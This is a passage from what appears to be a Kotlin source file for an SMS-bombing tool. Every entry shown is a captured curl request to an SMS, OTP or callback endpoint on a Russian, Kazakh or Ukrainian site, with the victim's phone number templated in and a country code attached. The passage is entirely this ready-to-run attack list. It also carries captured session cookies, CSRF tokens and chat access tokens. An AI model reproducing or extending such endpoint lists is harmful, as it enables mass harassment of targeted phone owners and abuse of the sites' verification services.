                          -H 'cookie: pddst=v2; memka=0; PHPSESSID=imrjp6tsqbimanrf1d85huud7q; adkeyword=534327759d72b481938233826edd6ee9847177953696aacc95844abfc7a5db52a%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22adkeyword%22%3Bi%3A1%3Bi%3A-1%3B%7D; adid=911d83596eb611201487d2bdc50c71236b4b050a8782b35387ad6affdfc4b36da%3A2%3A%7Bi%3A0%3Bs%3A4%3A%22adid%22%3Bi%3A1%3Bi%3A-1%3B%7D; geo_method=by_cookie; _csrf=34242663a383d7ee0cfac8e50ea892422673904b5ff156c45f0aa37dd6efbea2a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22Oxnv2r4wSthC3rykvJyveHDNWKmwr41p%22%3B%7D; pddst=v2; memka=0; _gcl_au=1.1.157795892.1683472136; _ga=GA1.2.256322644.1683472136; _gid=GA1.2.1200198156.1683472136; _gat_gtag_UA_50017317_1=1; rrpvid=190100772915140; _ym_uid=1683472136104989003; _ym_d=1683472136; JivoSiteLoaded=1; _ym_isad=2; rcuid=6275fcd65368be000135cd22; adcompany=7c825d9d3ee5712d9ee3ca2681eee424dca0039b6369916bc8e1c044811edc3fa%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22adcompany%22%3Bi%3A1%3Bs%3A47%3A%22697_6597b001defffb91c8aaa45b5855f594_1683472137%22%3B%7D; rememberedLocale=true; ct_static_user_id=1190022; __utmz=utmcsr%3D(direct)%7Cctd%7Cutmccn%3D(not%20set)%7Cctd%7Cutmcmd%3D(none)%7Cctd%7Cutmctr%3D-%7Cctd%7Cutmcct%3D-%7Cctd%7Creferrer%3Dhttp%3A%2F%2Fspb.partsdirect.ru%2F%7Cctd%7Clanding%3Dhttps%25253A%2F%2Fspb.partsdirect.ru%2F%252523login; __imz=utmcsr%3D(direct)%7Cctd%7Cutmccn%3D(not%20set)%7Cctd%7Cutmcmd%3D(none)%7Cctd%7Cutmctr%3D-%7Cctd%7Cutmcct%3D-%7Cctd%7Creferrer%3Dhttp%3A%2F%2Fspb.partsdirect.ru%2F%7Cctd%7Clanding%3Dhttps%25253A%2F%2Fspb.partsdirect.ru%2F%252523login; ct_url_metrics=%7B%7D' \
                          -H 'referer: https://spb.partsdirect.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://finardi.ru/shared/callme' \
                          -H 'Accept: */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json' \
                          -H 'Cookie: csrftoken=A8hEo2eHsDLhsaCVoNTt4Iv105uqmqZ9mTEZpfbfxmuuPjbEpRnyZE8GGrv12Fc4; _ym_uid=1683457383715126006; _ym_d=1683457383; _ym_isad=2' \
                          -H 'Origin: https://finardi.ru' \
                          -H 'Referer: https://finardi.ru/' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{"type":"order","name":"Сергей","phone":"+{phone:7 (***) ***-**-**}","igree":"on","currenturl":"https://finardi.ru/","utm":"=undefined"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://sberpravo.ru/api/client-profile/v1/user-verify/send/v2' \
                          -H 'Accept: application/json, text/plain, */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json' \
                          -H 'Cookie: SALE_UTMS={}; _ym_uid=1683473648501243152; _ym_d=1683473648; _ym_isad=2; _ym_visorc=w; prevRoute=/private-clients; prevRouteDate=2023-05-07T15:34:09.688Z' \
                          -H 'Origin: https://sberpravo.ru' \
                          -H 'Referer: https://sberpravo.ru/' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{"phoneOrEmail":"+{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://lk.dune-hd.tv/v2/otps' \
                          -H 'authority: lk.dune-hd.tv' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'cookie: _ym_uid=1684849868915006420; _ym_d=1684849868; _ym_isad=2; _ym_visorc=w; csrftoken=m2Yd48O2Ui5BKsIDRwdWrhZgiHpNwMmV' \
                          -H 'origin: https://lk.dune-hd.tv' \
                          -H 'referer: https://lk.dune-hd.tv/site' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw '{ "phone": "{full_phone}" }' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://program33.ru/ajax/' \
                          -H 'authority: program33.ru' \
                          -H 'accept: text/html, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: PHPSESSID=69eb5e61836acda1a4f7f9df48ef391d; _ym_uid=1684852122599462036; _ym_d=1684852122; _ym_isad=2; _ym_visorc=w' \
                          -H 'origin: https://program33.ru' \
                          -H 'referer: https://program33.ru/auth/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'action=phone_registration&phone=%2B{phone:7+(***)+***-**-**}&agreements=1' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://api.privsosed.ru/anketa/api/send-sms/' \
                          -H 'authority: api.privsosed.ru' \
                          -H 'accept: */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'cookie: _ym_uid=1684851846790774899; _ym_d=1684851846; _ym_isad=2; _ym_visorc=w; session_id=92bd23da-3dce-4008-aad4-991e44ccd304' \
                          -H 'origin: https://privsosed.ru' \
                          -H 'referer: https://privsosed.ru/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          --data-raw '{"phone":"{phone:+7 (***) ***-**-**}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://polyana1c.ru:25101/CRM/hs/pd/auth/send-code' \
                          -H 'authority: polyana1c.ru:25101' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'bearer: sqsqvr' \
                          -H 'content-type: application/json' \
                          -H 'origin: https://polyana.delivery' \
                          -H 'referer: https://polyana.delivery/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: cross-site' \
                          --data-raw '{"phoneNumber":"+{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 7
    ),

    CurlService(
        """
                        curl 'https://login.bilimland.kz/api/v1/registration' \
                          -H 'Accept: application/json, text/plain, */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json;charset=UTF-8' \
                          -H 'Cookie: _ga=GA1.1.1036095865.1686467148; bilimlandloginservice_session=0CSfVh3iCXLvoaskmViQoBsf0KsYmuyOYJf0ITTH; _ga_0GXFMK8SLT=GS1.1.1686467148.1.0.1686467149.0.0.0; _ym_uid=1686467150699294129; _ym_d=1686467150; guu=; _ym_isad=2; _ym_visorc=b; _zero_cc=6fe9f972072148; _ga_ELKR2LCK3P=GS1.1.1686467149.1.1.1686467156.0.0.0; _zero_ss=6485724e79dfb.1686467151.1686467157.2' \
                          -H 'Origin: https://login.bilimland.kz' \
                          -H 'Referer: https://login.bilimland.kz/register' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'X-Requested-With: XMLHttpRequest' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --data-raw '{"phone":"{phone:+7 (7**) ***-**-**}"}' \
                          --compressed
                          """.trimIndent(), 77
    ),

    CurlService(
        """
                        curl 'https://kumo.com.ua/ru/registration/sms/' \
                          -H 'authority: kumo.com.ua' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: _gid=GA1.3.94987512.1686468523; _ga_Y2NNEB8P3T=GS1.1.1686468523.1.1.1686468688.58.0.0; _ga=GA1.3.2045236862.1686468523; _gat_gtag_UA_188625914_1=1; XSRF-TOKEN=eyJpdiI6IkRWK0ZDNHMrREhmOW9NR2RCbzVFNGc9PSIsInZhbHVlIjoiV0FmTDFCaGliU3pjQjV4MEYzdHhPSlBZWTIrN01rcDVMVEdGdmxtU0pja3BuWktsOHpEcGpGQzE3SWxNb1dKZSIsIm1hYyI6IjU0YjY1ZDEwM2E2MzQ1MWIxYWJhNjM5MjdmMzM0ZDI1MWNkMzcxOGMwZTExYmMyY2U3OGVlZmI2YWU2OWZiYTkifQ%3D%3D; bank=eyJpdiI6IjlzNkpIdTQraVczQ0NDb0IxK1dhSWc9PSIsInZhbHVlIjoiZ3lPaE5LZXB5dFVMXC9pZzZxNXlkVTlKSDViY0ZueU9NN3k5YklXUmtqd1NWSTYrMjFoVWJDa2dnUHNSUENDV0QiLCJtYWMiOiJmY2NmYWMzMGIzNzQ3ZmNmYzEyMGY3Y2I3NTQ5MzhkNWIyNDdhYjZmYTljNDdhZWFhYmE2Mjc1NTVlY2Y2ODUyIn0%3D' \
                          -H 'origin: https://kumo.com.ua' \
                          -H 'referer: https://kumo.com.ua/ru/registration/init' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'phone=%2B{phone:380+**+***+**+**}&_token=qwhYeyrHjxIblkNUXRlaGK4hUeJHVEPNK3xz4HWD&g-recaptcha-response=1' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://lovilave.com.ua/v2/sign/request' \
                          -H 'authority: lovilave.com.ua' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: uk' \
                          -H 'content-type: application/json' \
                          -H 'cookie: _gcl_au=1.1.1902977449.1686469253; _ga_Y1SVLVNS5R=GS1.1.1686469252.1.0.1686469252.0.0.0; _ga=GA1.3.975911309.1686469253; _gid=GA1.3.620545716.1686469253; _gat_UA-172658742-1=1; _fbp=fb.2.1686469253544.1320113708; AWSALB=7eI/rLFiex3SkFp1N69Lu05c4c5GJ6Sgy45uu3cTVWvT8+SGK4dOE3IblmV2m4sL8M9TOJ894lBIF9gAm1qjR+fM3ZkoXDLdqgeNaR/kFQrCYCLj6M+J+S8l79u0WLjmEfoPy6+qGTP0rCCESVut3QRw3pBy5TeAFZiSE6nq9OhFM53LoCBFIGD5zNmF0g==; AWSALBCORS=7eI/rLFiex3SkFp1N69Lu05c4c5GJ6Sgy45uu3cTVWvT8+SGK4dOE3IblmV2m4sL8M9TOJ894lBIF9gAm1qjR+fM3ZkoXDLdqgeNaR/kFQrCYCLj6M+J+S8l79u0WLjmEfoPy6+qGTP0rCCESVut3QRw3pBy5TeAFZiSE6nq9OhFM53LoCBFIGD5zNmF0g==' \
                          -H 'origin: https://lovilave.com.ua' \
                          -H 'referer: https://lovilave.com.ua/signin' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          --data-raw '{"Request":{"phone":"{full_phone}"}}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://api.tengo.ua/api/v1/user-register?language=uk' \
                          -H 'authority: api.tengo.ua' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json' \
                          -H 'device-identificator: 68b4f05d5595b97b76c7c28f8246f830_787882041.1686469655' \
                          -H 'network-connection-effective-type: 4g' \
                          -H 'origin: https://tengo.ua' \
                          -H 'referer: https://tengo.ua/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          --data-raw '{"lastname":"","name":"","patronymic":"","pesel":"","mobile":"+{full_phone}","consents":[{"label":"Надаю ТОВ \${'"'}Мілоан\${'"'} свою <a href=\${'"'}https://content.miloan.ua/uploads/elFinder/zgoda_pers_data-14092018.pdf\${'"'} target=\${'"'}_blank\${'"'}>згоду на отримання, збереження та обробку моїх персональних даних</a>.","value":"f5db295c-1802-4a35-a803-5cbff4038e89","required":true,"checked":true},{"label":"Не заперечую щодо отримання інформаційних повідомлень про новини, пропозиції кредитних продуктів та послуг від ТОВ \${'"'}Мілоан\${'"'}.","value":"442868e1-32e3-47e6-8bc0-1f8a685bc262","required":false,"checked":false}],"marketing":{"channel":"site","externalId":16864696541892,"instrument":"direct","subchannel":"tengo"},"detectedData":{"deviceId":"68b4f05d5595b97b76c7c28f8246f830_787882041.1686469655","deviceTypeId":"desktop","deviceModel":"windows","hashComponents":"key=userAgent;value=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36;key=language;value=ru;key=screenResolution;value=864,1536;key=timezone;value=Europe/Moscow;","screenResolution":"864,1536","browser":"chrome 108.0.0.0","webLanguage":"RU","webCountry":"Europe/Moscow"},"curSum":10000,"curTerm":15,"promocode":""}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://shop.kyivstar.ua/api/v2/otp_login/send/{phone:0*********}' \
                          -H 'Accept: application/json, text/plain, */*' \
                          -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'Connection: keep-alive' \
                          -H 'Cookie: _gcl_au=1.1.284443421.1686471093; _ga=GA1.2.1844012872.1686471093; _gid=GA1.2.1710388172.1686471094; _gat_UA-30371516-1=1; _gat_UA-68448222-1=1; _clck=h3oupt|2|fcd|0|1257; _fbp=fb.1.1686471094722.441822642; _dc_gtm_UA-68448222-1=1; hl=ua; kyivstar=cb6ee2d1f26b606eb72ca9771e57e972; _hjSessionUser_713006=eyJpZCI6IjkwOGIxYWQ2LTgwYjAtNTBjOC1iNmU2LTNmNmQyZmZmN2MyZSIsImNyZWF0ZWQiOjE2ODY0NzEwOTQ5NjYsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_713006=0; _hjSession_713006=eyJpZCI6IjIxMzI3ZGYzLTJmYTEtNGYzYi04YWM2LTA0NDU4Y2JkODVhMCIsImNyZWF0ZWQiOjE2ODY0NzEwOTQ5NzcsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; user_phone_cookie=non_authenticated; _clsk=t58u8z|1686471126501|2|1|m.clarity.ms/collect; _ga_L4DKTSE2Y3=GS1.1.1686471093.1.1.1686471126.27.0.0' \
                          -H 'Referer: https://shop.kyivstar.ua/smartphones?loginRedirect=%2Fprofile%2Forders' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://elmir.ua/response/load_json.php?type=validate_phone' \
                          -H 'authority: elmir.ua' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: visit=https%3A%2F%2Felmir.ua%2Fcell_phones%2F; chat_id=guest%3A1686471415.9541%3A1800068454; h=..s8gS1Be%60-%25SItfwxdS; h=..s8gS1Be%60-%25SItfwxdS; elm38=169034859; ua=0; PHPSESSID=h201a3nbf3suhgbf5d42ves7j9; sess=71fSWEytF671fSWEytF6; sess3=71fSWEytF671fSWEytF6; _ga=GA1.2.1614924221.1686471410; _gid=GA1.2.767035712.1686471411; _fbp=fb.1.1686471411192.1498870346; slow=181.4; device-source=https://elmir.ua/cell_phones/; device-referrer=; helpcrunch.com-elmir-2-user-id=guest:1686471415.9541:1800068454; helpcrunch.com-elmir-2-helpcrunch-device={"id":2551856,"secret":"zJzeg4zIOK3Zr4tqpo56ltdMjdKvtBNbFd3d0oV1ifR9T+KOME81EX5/BtPVCHuCIyhAvj2JUQ+aE+sGlBSfMQ==","sessions":1}; helpcrunch.com-elmir-2-device-id=2551856; helpcrunch.com-elmir-2-token-data={"access_token":"3ok8GHc3HcLWiY9SD8Qw7gwgg1kDnIiPKAZmzTT8XX3ZF8Ubsc26rrQFWhIvYWDQqJJvqfT+zUDy1EWbFjqyiGyXfyLS4lCDsYmlgmQyryCk/1YYbVXgvgvvTW2AJlQ04xN0dJY10U0tHcvkXF4HoxDCQ5nx2cTClGJX2lVvPiRsNn/aKod1X70cYayX5ovZJS8erCZ22ger39YyNjlUwXzta3wBX2mjMN6aseIKMSwIwtIxL7ssnAeteR9WfyGXkpYaqgCUUI7Z459wZ1AHf117LP82qpVHpTlK5ldCpH3eRiHabniKWH2l4s5nkSGBUnvP3yFC8QWqK1xPPdDqpuWS8+7u5SnC4TrUhEajhUkcQOGbESpohIyN9BuetefJ33NOKLmGPS0JC8KkiEclRubEo5DTTG804JkdBbNzd9CX7dizXBKCxCl1umAAhOoJR5D6mE4NBeId7PMQY28v45msxID+WaQFVXXDX1grD438OzdIphaxDAwRu+qOZbq8H4rJkbQOhB+w4qToLYJSzdz8LnAxGOglZuOcJGkly59teydhjoYCc6JHh0O+xydUWjJc5+BhUEMIDNIf3nTWjHOp63qZIsRcYceFMMCw4XY99e58UDnlEeDuT0klapk1hnBrwrqWuLQul/vqvy2PuQc5qD9J/IFnRnBqwSJzVotb7k7DZPjQSAyxvn/2MqxNDyohBzea4lI9stHj2j1gacq/STSLGqT4eANP14bYcXJtxMkkC86Eon7eXgYxwtIh4W5WwI4ycNwXJXg4VhNtdWe5n6Fwg+zVJhEcu72wdnyRk/pEtnGWI+eKrPdvQfZy","refresh_token":"NSrTYUuA7TeztRwgFREjb2zjxuMm0JPA+pJ9yzWyykWAOg45qMzLzeDxPUfbjpJ1BdDzV/KmbkHB7F3TJCsK","expires_in":1686473099458}; _ga_79B3PN4ZWG=GS1.1.1686471410.1.1.1686471459.11.0.0' \
                          -H 'origin: https://elmir.ua' \
                          -H 'referer: https://elmir.ua/cell_phones/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'fields%5Bphone%5D=%2B{full_phone}&fields%5Bcall_from%5D=register&fields%5Bsms_code%5D=&action=call' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://elmir.ua/response/load_json.php?type=validate_phone' \
                          -H 'authority: elmir.ua' \
                          -H 'accept: application/json, text/javascript, */*; q=0.01' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
                          -H 'cookie: visit=https%3A%2F%2Felmir.ua%2Fcell_phones%2F; chat_id=guest%3A1686471415.9541%3A1800068454; h=..s8gS1Be%60-%25SItfwxdS; h=..s8gS1Be%60-%25SItfwxdS; elm38=169034859; ua=0; PHPSESSID=h201a3nbf3suhgbf5d42ves7j9; sess=71fSWEytF671fSWEytF6; sess3=71fSWEytF671fSWEytF6; _ga=GA1.2.1614924221.1686471410; _gid=GA1.2.767035712.1686471411; _fbp=fb.1.1686471411192.1498870346; slow=181.4; device-source=https://elmir.ua/cell_phones/; device-referrer=; helpcrunch.com-elmir-2-user-id=guest:1686471415.9541:1800068454; helpcrunch.com-elmir-2-helpcrunch-device={"id":2551856,"secret":"zJzeg4zIOK3Zr4tqpo56ltdMjdKvtBNbFd3d0oV1ifR9T+KOME81EX5/BtPVCHuCIyhAvj2JUQ+aE+sGlBSfMQ==","sessions":1}; helpcrunch.com-elmir-2-device-id=2551856; helpcrunch.com-elmir-2-token-data={"access_token":"3ok8GHc3HcLWiY9SD8Qw7gwgg1kDnIiPKAZmzTT8XX3ZF8Ubsc26rrQFWhIvYWDQqJJvqfT+zUDy1EWbFjqyiGyXfyLS4lCDsYmlgmQyryCk/1YYbVXgvgvvTW2AJlQ04xN0dJY10U0tHcvkXF4HoxDCQ5nx2cTClGJX2lVvPiRsNn/aKod1X70cYayX5ovZJS8erCZ22ger39YyNjlUwXzta3wBX2mjMN6aseIKMSwIwtIxL7ssnAeteR9WfyGXkpYaqgCUUI7Z459wZ1AHf117LP82qpVHpTlK5ldCpH3eRiHabniKWH2l4s5nkSGBUnvP3yFC8QWqK1xPPdDqpuWS8+7u5SnC4TrUhEajhUkcQOGbESpohIyN9BuetefJ33NOKLmGPS0JC8KkiEclRubEo5DTTG804JkdBbNzd9CX7dizXBKCxCl1umAAhOoJR5D6mE4NBeId7PMQY28v45msxID+WaQFVXXDX1grD438OzdIphaxDAwRu+qOZbq8H4rJkbQOhB+w4qToLYJSzdz8LnAxGOglZuOcJGkly59teydhjoYCc6JHh0O+xydUWjJc5+BhUEMIDNIf3nTWjHOp63qZIsRcYceFMMCw4XY99e58UDnlEeDuT0klapk1hnBrwrqWuLQul/vqvy2PuQc5qD9J/IFnRnBqwSJzVotb7k7DZPjQSAyxvn/2MqxNDyohBzea4lI9stHj2j1gacq/STSLGqT4eANP14bYcXJtxMkkC86Eon7eXgYxwtIh4W5WwI4ycNwXJXg4VhNtdWe5n6Fwg+zVJhEcu72wdnyRk/pEtnGWI+eKrPdvQfZy","refresh_token":"NSrTYUuA7TeztRwgFREjb2zjxuMm0JPA+pJ9yzWyykWAOg45qMzLzeDxPUfbjpJ1BdDzV/KmbkHB7F3TJCsK","expires_in":1686473099458}; _ga_79B3PN4ZWG=GS1.1.1686471410.1.1.1686471459.11.0.0' \
                          -H 'origin: https://elmir.ua' \
                          -H 'referer: https://elmir.ua/cell_phones/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-origin' \
                          -H 'x-requested-with: XMLHttpRequest' \
                          --data-raw 'fields%5Bphone%5D=%2B{full_phone}&fields%5Bcall_from%5D=register&fields%5Bsms_code%5D=&action=code' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://my.ctrs.com.ua/api/v2/signup' \
                          -H 'authority: my.ctrs.com.ua' \
                          -H 'accept: application/json, text/plain, */*' \
                          -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \
                          -H 'content-type: application/json;charset=UTF-8' \
                          -H 'cookie: _gcl_au=1.1.1138851447.1686471959; sc=B5AC0EB8-2401-CFC7-54AA-72C8D8E331BD; _ga_LNJDP61TWH=GS1.1.1686471962.1.0.1686471962.60.0.0; _clck=o54405|2|fcd|0|1257; _ga=GA1.3.1322381805.1686471962; _gid=GA1.3.213483907.1686471963; _dc_gtm_UA-2170097-28=1; _fbp=fb.2.1686471963289.1814527937; _clsk=1isklwh|1686471964449|1|1|m.clarity.ms/collect' \
                          -H 'origin: https://www.ctrs.com.ua' \
                          -H 'referer: https://www.ctrs.com.ua/smartfony-mobilnye-telefony/' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
                          -H 'sec-fetch-dest: empty' \
                          -H 'sec-fetch-mode: cors' \
                          -H 'sec-fetch-site: same-site' \
                          -H 'x-app-token: yF27jwg5orUVo4abrops' \
                          -H 'x-locale: uk' \
                          --data-raw '{"name":"gergre","phone":"{full_phone}"}' \
                          --compressed
                          """.trimIndent(), 380
    ),

    CurlService(
        """
                        curl 'https://synthetic.ua/api/auth/register/' \
                          -H 'Accept: application/json, text/plain, */*' \
                          -H 'Accept-Language: uk' \
                          -H 'Connection: keep-alive' \
                          -H 'Content-Type: application/json' \
                          -H 'Cookie: auth_access=; auth_refresh=; userFirstEntry=true; _tt_enable_cookie=1; _ttp=hc0DwzbP01r_r6EFG8VIWS4mL3B; _gid=GA1.2.948021620.1686472100; _gat_gtag_UA_137014419_1=1; _gcl_au=1.1.1118644271.1686472100; _ga=GA1.1.1441804281.1686472100; _ga_H5ZK4FY06P=GS1.1.1686472100.1.1.1686472100.60.0.0; _fbp=fb.1.1686472100880.1304441811; metrics_token=73cc8dbd-f30c-435c-a92c-ddab19e7785b' \
                          -H 'Origin: https://synthetic.ua' \
                          -H 'Referer: https://synthetic.ua/' \
                          -H 'Sec-Fetch-Dest: empty' \
                          -H 'Sec-Fetch-Mode: cors' \
                          -H 'Sec-Fetch-Site: same-origin' \
                          -H 'sec-ch-ua: "Google Chrome";v="108", "Chromium";v="108", "Not=A?Brand";v="24"' \
                          -H 'sec-ch-ua-mobile: ?0' \
                          -H 'sec-ch-ua-platform: "Windows"' \
